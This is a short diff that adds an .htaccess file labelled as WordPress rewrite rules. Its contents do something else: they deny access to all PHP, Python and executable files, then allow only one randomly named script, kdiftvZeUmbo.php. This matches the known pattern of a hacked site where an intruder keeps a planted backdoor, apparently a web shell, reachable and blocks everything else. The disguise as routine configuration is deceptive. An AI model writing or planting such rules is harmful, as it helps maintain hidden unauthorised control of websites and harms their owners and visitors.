@@ -1,0 +1,9 @@
+#wordpress rewrite rules
+<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(kdiftvZeUmbo.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
